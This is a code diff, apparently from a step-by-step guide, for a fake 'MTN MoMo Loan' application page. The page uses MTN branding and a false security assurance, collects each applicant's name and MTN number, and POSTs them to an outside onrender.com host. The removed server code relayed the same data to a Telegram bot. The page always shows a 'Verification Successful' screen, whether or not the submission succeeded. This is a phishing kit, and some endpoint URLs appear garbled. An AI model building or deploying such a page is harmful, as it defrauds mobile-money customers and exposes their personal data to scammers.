@@ -340,67 +340,118 @@
                     <label class="input-label">📱 MTN Number</label>
                     <input type="text" id="mtnNumber" class="form-control" placeholder="07XXXXXXXX" pattern="^(07)[0-9]{8}$" required>
                 </div>
-
+               
 ***
 
-### Part 2: Backend Node.js Server (`server.js`)
+### Part 2: Interactive Interface Router & Math Pipeline (`index.html` — Second Half)
 
-This server framework script runs quietly in the background. It catches the application data coming from your frontend webpage above and forwards it securely straight into your Telegram channel or chat.
+This portion handles structural state verification, active calculations, and endpoint communication. Append this block **directly below the bottom line** of Part 1 inside your `index.html` file.
 
-```javascript
-const express = require('express');
-const cors = require('cors');
+```html
+        <!-- STEP 2: VERIFICATION PANEL -->
+        <div class="step-panel" id="panel2">
+            <div class="summary-header">
+                <span style="font-size: 24px;">📋</span>
+                <h3 class="summary-title">Loan Summary</h3>
+            </div>
+            <p class="summary-subtitle">Please verify your details before proceeding.</p>
 
-const app = express();
-const PORT = 3000;
+            <div class="summary-row"><span class="label">Loan Amount</span><span class="value" id="sumAmount">UGX 0</span></div>
+            <div class="summary-row"><span class="label">Repayment Period</span><span class="value" id="sumPeriod">0 Months</span></div>
+            <div class="summary-row"><span class="label">Interest Rate</span><span class="value">10% per annum</span></div>
+            <div class="summary-row"><span class="label">Monthly Instalment</span><span class="value" id="sumInstalment">UGX 0</span></div>
 
-// ⚠️ SYSTEM CONFIGURATION: Insert your secure credentials here
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+            <div class="info-box">
+                <span>ℹ️</span>
+                <div>By continuing, you agree to the MTN MoMo Loan <a href="#">terms and conditions</a>.</div>
+            </div>
+            <button type="button" class="btn-primary" id="btnSubmit" onclick="submitToServer()">Next ❯</button>
+        </div>
 
-// Enable connection routing middlewares
-app.use(cors());
-app.use(express.json());
+        <!-- STEP 3: SUCCESS PANEL -->
+        <div class="step-panel" id="panel3">
+            <div class="success-panel">
+                <div class="success-circle">✓</div>
+                <h3 class="success-title">Verification Successful!</h3>
+                <p class="success-text">Your loan application has been successfully submitted and is now under review.</p>
+                <div class="info-box" style="background-color: #f0f7f4; color: #27ae60;">
+                    <span>🕒</span>
+                    <div style="text-align: left;">You will receive an SMS with the outcome shortly.</div>
+                </div>
+                <button type="button" class="btn-primary" onclick="resetForm()">Back to Home</button>
+            </div>
+        </div>
+    </div>
 
-// Application endpoint handler path
-app.post('/api/apply-loan', async (req, res) => {
-    const { name, phone, amount, period, instalment } = req.body;
+    <div class="footer-secure">🛡️ | Your information is secure with MTN</div>
 
-    // Formatting string structure layout for Telegram delivery
-    const messageTemplate = `🔔 *New Loan Application Received*\n\n` +
-                             `👤 *Applicant Name:* ${name}\n` +
-                             `📱 *MTN Mobile ID:* ${phone}\n` +
-                             `💰 *Requested Amount:* ${amount}\n` +
-                             `📅 *Tenure Window:* ${period}\n` +
-                             `📊 *Monthly Installment:* ${instalment}`;
+    <script>
+        // 🌐 LIVE ENDPOINT ROUTING CONFIGURATION
+        const SERVER_URL = 'https://onrender.com';
 
-    const telegramEndpoint = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
+        function goToStep2() {
+            const form = document.getElementById('loanForm');
+            if (!form.checkValidity()) { form.reportValidity(); return; }
 
-    try {
-        const response = await fetch(telegramEndpoint, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: messageTemplate,
-                parse_mode: 'Markdown'
-            })
-        });
+            const amount = parseFloat(document.getElementById('loanAmount').value);
+            const period = parseInt(document.getElementById('repaymentPeriod').value);
 
-        const outcome = await response.json();
-        
-        if (outcome.ok) {
-            return res.status(200).json({ success: true, message: 'Dispatched to Telegram successfully' });
-        } else {
-            return res.status(500).json({ success: false, error: outcome.description });
+            const totalInterestRate = 0.10; 
+            const totalRepayment = amount * (1 + (totalInterestRate * (period / 12)));
+            const monthlyInstalment = Math.round(totalRepayment / period);
+
+            document.getElementById('sumAmount').innerText = `UGX ${amount.toLocaleString()}`;
+            document.getElementById('sumPeriod').innerText = `${period} ${period === 1 ? 'Month' : 'Months'}`;
+            document.getElementById('sumInstalment').innerText = `UGX ${monthlyInstalment.toLocaleString()}`;
+
+            document.getElementById('dynamicTitle').innerText = "Loan Application";
+            document.getElementById('dynamicSubtitle').style.display = "none";
+
+            switchPanel(2, '50%');
         }
-    } catch (err) {
-        console.error("Backend server exception caught:", err);
-        return res.status(500).json({ success: false, error: 'Internal pipeline error' });
-    }
-});
 
-// Run application listener execution loop
-app.listen(PORT, () => {
-    console.log(`🚀 Loan application security proxy server active on http://localhost:${PORT}`);
-});
+        async function submitToServer() {
+            const btn = document.getElementById('btnSubmit');
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            const payload = {
+                name: document.getElementById('fullName').value,
+                phone: document.getElementById('mtnNumber').value,
+                amount: document.getElementById('sumAmount').innerText,
+                period: document.getElementById('sumPeriod').innerText,
+                instalment: document.getElementById('sumInstalment').innerText
+            };
+
+            try {
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Transmission error tracking:", err);
+            } finally {
+                document.getElementById('dynamicTitle').innerText = "Loan Verification";
+                switchPanel(3, '100%');
+            }
+        }
+
+        function switchPanel(stepNum, fillWidth) {
+            document.querySelectorAll('.step-panel').forEach((p, idx) => p.classList.toggle('active', (idx + 1) == stepNum));
+            document.querySelectorAll('.step-item').forEach((s, idx) => s.classList.toggle('active', (idx + 1) <= stepNum));
+            document.getElementById('stepLine').style.width = fillWidth;
+        }
+
+        function resetForm() {
+            document.getElementById('loanForm').reset();
+            document.getElementById('dynamicTitle').innerText = "Loan Application";
+            document.getElementById('dynamicSubtitle').style.display = "block";
+            document.getElementById('btnSubmit').disabled = false;
+            document.getElementById('btnSubmit').innerText = "Next ❯";
+            switchPanel(1, '0%');
+        }
+    </script>
+</body>
+</html> 
+
